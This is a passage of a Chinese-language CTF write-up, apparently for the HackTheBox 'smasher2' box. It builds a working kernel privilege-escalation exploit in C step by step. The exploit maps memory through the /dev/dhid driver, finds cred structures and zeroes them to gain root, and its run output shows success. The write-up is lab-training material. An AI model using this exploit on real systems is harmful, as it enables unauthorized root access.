class="line">00000000-00000000 : PCI Bus 0000:00</span><br><span class="line">00000000-00000000 : Video ROM</span><br><span class="line">00000000-00000000 : Adapter ROM</span><br><span class="line">00000000-00000000 : PCI Bus 0000:00</span><br><span class="line">00000000-00000000 : PCI Bus 0000:00</span><br><span class="line">00000000-00000000 : PCI Bus 0000:00</span><br><span class="line">00000000-00000000 : PCI Bus 0000:00</span><br><span class="line">00000000-00000000 : Reserved</span><br><span class="line">  00000000-00000000 : System ROM</span><br><span class="line">00000000-00000000 : System RAM</span><br><span class="line">  00000000-00000000 : Kernel code</span><br><span class="line">  00000000-00000000 : Kernel data</span><br><span class="line">  00000000-00000000 : Kernel bss</span><br><span class="line">00000000-00000000 : ACPI Tables</span><br><span class="line">00000000-00000000 : ACPI Non-volatile Storage</span><br><span class="line">00000000-00000000 : System RAM</span><br><span class="line">00000000-00000000 : PCI Bus 0000:00</span><br><span class="line">  00000000-00000000 : 0000:00:10.0</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:22</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1a</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:12</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0a</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:21</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:19</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:11</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:09</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:20</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:18</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:10</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:08</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1f</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:17</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0f</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:07</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1e</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:16</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0e</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:06</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1d</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:15</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0d</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:05</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1c</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:14</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0c</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:04</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1b</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:13</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0b</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:03</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:02</span><br><span class="line">  00000000-00000000 : 0000:00:0f.0</span><br><span class="line">    00000000-00000000 : vmwgfx probe</span><br><span class="line">  00000000-00000000 : PCI MMCONFIG 0000 [bus 00-7f]</span><br><span class="line">    00000000-00000000 : Reserved</span><br><span class="line">      00000000-00000000 : pnp 00:05</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:22</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1a</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:12</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0a</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:21</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:19</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:11</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:09</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:20</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:18</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:10</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:08</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1f</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:17</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0f</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:07</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1e</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:16</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0e</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:06</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1d</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:15</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0d</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:05</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1c</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:14</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0c</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:04</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1b</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:13</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0b</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:03</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:02</span><br><span class="line">    00000000-00000000 : 0000:02:01.0</span><br><span class="line">    00000000-00000000 : 0000:02:03.0</span><br><span class="line">      00000000-00000000 : ehci_hcd</span><br><span class="line">    00000000-00000000 : 0000:02:02.0</span><br><span class="line">      00000000-00000000 : ICH HD audio</span><br><span class="line">  00000000-00000000 : 0000:00:0f.0</span><br><span class="line">    00000000-00000000 : vmwgfx probe</span><br><span class="line">  00000000-00000000 : pnp 00:05</span><br><span class="line">  00000000-00000000 : 0000:00:10.0</span><br><span class="line">    00000000-00000000 : mpt</span><br><span class="line">  00000000-00000000 : 0000:00:10.0</span><br><span class="line">    00000000-00000000 : mpt</span><br><span class="line">  00000000-00000000 : 0000:00:07.7</span><br><span class="line">00000000-00000000 : Reserved</span><br><span class="line">  00000000-00000000 : IOAPIC 0</span><br><span class="line">00000000-00000000 : HPET 0</span><br><span class="line">  00000000-00000000 : pnp 00:04</span><br><span class="line">00000000-00000000 : Local APIC</span><br><span class="line">  00000000-00000000 : Reserved</span><br><span class="line">00000000-00000000 : Reserved</span><br></pre></td></tr></table></figure>

<ul>
<li>查找凭证结构</li>
</ul>
<p>现在，更新上面的代码以通过获取当前uid来在内存中查找凭证对象，然后添加一个循环以连续八次查找该int：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char* const* argv)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] PID: %d\n&quot;</span>, getpid());</span><br><span class="line">    int fd = open(<span class="string">&quot;/dev/dhid&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Open failed!\n&quot;</span>);</span><br><span class="line">        return-1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Open OK fd: %d\n&quot;</span>, fd);</span><br><span class="line"></span><br><span class="line">    unsigned long size = 0xf0000000;</span><br><span class="line">    unsigned long mmapStart = 0x42424000;</span><br><span class="line">    unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>x0);</span><br><span class="line">    if (addr == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(&quot;Failed to mmap: &quot;);</span><br><span class="line">        close(fd);</span><br><span class="line">        return-<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    printf(&quot;[+] mmap OK addr: %x\n&quot;, addr);</span><br><span class="line"></span><br><span class="line">    unsigned int uid = getuid();</span><br><span class="line">    printf(&quot;[+] UID: %d\n&quot;, uid);</span><br><span class="line"></span><br><span class="line">    unsigned int credIt = <span class="number">0</span>;</span><br><span class="line">    unsigned int credNum = <span class="number">0</span>;</span><br><span class="line">    while (((unsigned long)addr) &lt; (mmapStart + size -<span class="number">0</span>x40))</span><br><span class="line">    &#123;</span><br><span class="line">        credIt = 0;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid</span><br><span class="line">            )</span><br><span class="line">        &#123;</span><br><span class="line">            credNum++;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Found cred structure! ptr: %p, credNum: %d\n&quot;</span>, addr, credNum);</span><br><span class="line">        &#125;</span><br><span class="line">        addr++;</span><br><span class="line">    &#125;</span><br><span class="line">    puts(<span class="string">&quot;[+] Scanning loop END&quot;</span>);</span><br><span class="line">    fflush(stdout);</span><br><span class="line"></span><br><span class="line">    int stop = getchar();</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我编译并运行时，它会发现19种潜在的cred structs:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:/dev/shm$ gcc exp2.c -o exp2</span><br><span class="line">exp2.c: In <span class="keyword">function</span> ‘main’:</span><br><span class="line">exp2.c:30:32: warning: format ‘%x’ expects argument of <span class="built_in">type</span> ‘unsigned int’, but argument 2 has <span class="built_in">type</span> ‘unsigned int *’ [-Wformat=]</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;[+] mmap OK addr: %x\n&quot;</span>, addr);</span><br><span class="line">                               ~^</span><br><span class="line">                               %<span class="built_in">ls</span></span><br><span class="line">dzonerzy@smasher2:/dev/shm$ ./exp2</span><br><span class="line">[+] PID: 1999</span><br><span class="line">[+] Open OK fd: 3</span><br><span class="line">[+] mmap OK addr: 42424000</span><br><span class="line">[+] UID: 1000</span><br><span class="line">[+] Found cred structure! ptr: 0x762ba6c4, credNum: 1</span><br><span class="line">[+] Found cred structure! ptr: 0x762ba9c4, credNum: 2</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a980c4, credNum: 3</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a98484, credNum: 4</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a99384, credNum: 5</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a99444, credNum: 6</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a995c4, credNum: 7</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a99c84, credNum: 8</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6184, credNum: 9</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6484, credNum: 10</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6544, credNum: 11</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6b44, credNum: 12</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6c04, credNum: 13</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6d84, credNum: 14</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d7744, credNum: 15</span><br><span class="line">[+] Found cred structure! ptr: 0xb8e86c04, credNum: 16</span><br><span class="line">[+] Found cred structure! ptr: 0xb8e87384, credNum: 17</span><br><span class="line">[+] Found cred structure! ptr: 0xb8e87984, credNum: 18</span><br><span class="line">[+] Found cred structure! ptr: 0xb9327c84, credNum: 19</span><br><span class="line">[+] Scanning loop END</span><br></pre></td></tr></table></figure>

<ul>
<li>查找当前进程Cred</li>
</ul>
<p>现在，更新代码，以便针对每个潜在的cred结构，将其更改为root用户和组ID 0，然后尝试运行getuid（）。 如果该值返回0（对于root用户），则说明我已经为当前进程修改了凭据结构。</p>
<p>更新代码，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char* const* argv)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] PID: %d\n&quot;</span>, getpid());</span><br><span class="line">    int fd = open(<span class="string">&quot;/dev/dhid&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Open failed!\n&quot;</span>);</span><br><span class="line">        return-1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Open OK fd: %d\n&quot;</span>, fd);</span><br><span class="line"></span><br><span class="line">    unsigned long size = 0xf0000000;</span><br><span class="line">    unsigned long mmapStart = 0x42424000;</span><br><span class="line">    unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>x0);</span><br><span class="line">    if (addr == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(&quot;Failed to mmap: &quot;);</span><br><span class="line">        close(fd);</span><br><span class="line">        return-<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    printf(&quot;[+] mmap OK addr: %x\n&quot;, addr);</span><br><span class="line"></span><br><span class="line">    unsigned int uid = getuid();</span><br><span class="line">    printf(&quot;[+] UID: %d\n&quot;, uid);</span><br><span class="line"></span><br><span class="line">    unsigned int credIt = <span class="number">0</span>;</span><br><span class="line">    unsigned int credNum = <span class="number">0</span>;</span><br><span class="line">    while (((unsigned long)addr) &lt; (mmapStart + size -<span class="number">0</span>x40))</span><br><span class="line">    &#123;</span><br><span class="line">        credIt = 0;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid</span><br><span class="line">            )</span><br><span class="line">        &#123;</span><br><span class="line">            credNum++;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Found cred structure! ptr: %p, credNum: %d\n&quot;</span>, addr, credNum);</span><br><span class="line"></span><br><span class="line">            credIt = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (getuid() == 0)</span><br><span class="line">            &#123;</span><br><span class="line">                puts(<span class="string">&quot;[+] GOT ROOT!&quot;</span>);</span><br><span class="line">                <span class="built_in">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                credIt = 0;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        addr++;</span><br><span class="line">    &#125;</span><br><span class="line">    puts(<span class="string">&quot;[+] Scanning loop END&quot;</span>);</span><br><span class="line">    fflush(stdout);</span><br><span class="line"></span><br><span class="line">    int stop = getchar();</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在，编译并运行，并且可以成为root用户，这意味着它可以正常工作：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:/dev/shm$ gcc exp3.c -o exp3</span><br><span class="line">exp3.c: In <span class="keyword">function</span> ‘main’:</span><br><span class="line">exp3.c:30:32: warning: format ‘%x’ expects argument of <span class="built_in">type</span> ‘unsigned int’, but argument 2 has <span class="built_in">type</span> ‘unsigned int *’ [-Wformat=]</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;[+] mmap OK addr: %x\n&quot;</span>, addr);</span><br><span class="line">                               ~^</span><br><span class="line">                               %<span class="built_in">ls</span></span><br><span class="line">dzonerzy@smasher2:/dev/shm$ ./exp3</span><br><span class="line">[+] PID: 2008</span><br><span class="line">[+] Open OK fd: 3</span><br><span class="line">[+] mmap OK addr: 42424000</span><br><span class="line">[+] UID: 1000</span><br><span class="line">[+] Found cred structure! ptr: 0x762ba6c4, credNum: 1</span><br><span class="line">[+] Found cred structure! ptr: 0x762ba9c4, credNum: 2</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a980c4, credNum: 3</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a99444, credNum: 4</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a995c4, credNum: 5</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a99c84, credNum: 6</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6184, credNum: 7</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6484, credNum: 8</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6544, credNum: 9</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6b44, credNum: 10</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6c04, credNum: 11</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6d84, credNum: 12</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d7144, credNum: 13</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d7204, credNum: 14</span><br><span class="line">[+] GOT ROOT!</span><br><span class="line">[+] Scanning loop END</span><br></pre></td></tr></table></figure>
<p>在等待getchar（）时，可以检查该进程的状态，并查看它以root身份运行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ <span class="built_in">cat</span> /proc/2008/status</span><br><span class="line">Name:   exp3</span><br><span class="line">Umask:  0002</span><br><span class="line">State:  S (sleeping)</span><br><span class="line">Tgid:   2008</span><br><span class="line">Ngid:   0</span><br><span class="line">Pid:    2008</span><br><span class="line">PPid:   1833</span><br><span class="line">TracerPid:      0</span><br><span class="line">Uid:    0       0       0       0     &lt;-- root</span><br><span class="line">Gid:    0       0       0       0     &lt;-- root group</span><br><span class="line">FDSize: 256</span><br><span class="line">Groups: 4 24 30 46 111 112 1000 </span><br><span class="line">NStgid: 2008</span><br><span class="line">NSpid:  2008</span><br><span class="line">NSpgid: 2008</span><br><span class="line">NSsid:  1833</span><br><span class="line">VmPeak:  3936672 kB</span><br><span class="line">VmSize:  3936672 kB</span><br><span class="line">VmLck:         0 kB</span><br><span class="line">VmPin:         0 kB</span><br><span class="line">VmHWM:       792 kB</span><br><span class="line">VmRSS:       792 kB</span><br><span class="line">RssAnon:              64 kB</span><br><span class="line">RssFile:             720 kB</span><br><span class="line">RssShmem:              8 kB</span><br><span class="line">VmData:      176 kB</span><br><span class="line">VmStk:       132 kB</span><br><span class="line">VmExe:         8 kB</span><br><span class="line">VmLib:      2112 kB</span><br><span class="line">VmPTE:      7760 kB</span><br><span class="line">VmSwap:        0 kB</span><br><span class="line">HugetlbPages:          0 kB</span><br><span class="line">CoreDumping:    0</span><br><span class="line">Threads:        1</span><br><span class="line">SigQ:   0/7400</span><br><span class="line">SigPnd: 0000000000000000</span><br><span class="line">ShdPnd: 0000000000000000</span><br><span class="line">SigBlk: 0000000000000000</span><br><span class="line">SigIgn: 0000000000000000</span><br><span class="line">SigCgt: 0000000000000000</span><br><span class="line">CapInh: 0000000000000000</span><br><span class="line">CapPrm: 0000000000000000</span><br><span class="line">CapEff: 0000000000000000</span><br><span class="line">CapBnd: 0000003fffffffff</span><br><span class="line">CapAmb: 0000000000000000</span><br><span class="line">NoNewPrivs:     0</span><br><span class="line">Seccomp:        0</span><br><span class="line">Speculation_Store_Bypass:       thread vulnerable</span><br><span class="line">Cpus_allowed:   ffffffff,ffffffff,ffffffff,ffffffff</span><br><span class="line">Cpus_allowed_list:      0-127</span><br><span class="line">Mems_allowed:   00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001</span><br><span class="line">Mems_allowed_list:      0</span><br><span class="line">voluntary_ctxt_switches:        1</span><br><span class="line">nonvoluntary_ctxt_switches:     96</span><br></pre></td></tr></table></figure>

<ul>
<li>get root</li>
</ul>
<p>现在，我将其升级以获得shell。 只需要添加将功能设置为全1的代码，然后执行一个shell：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 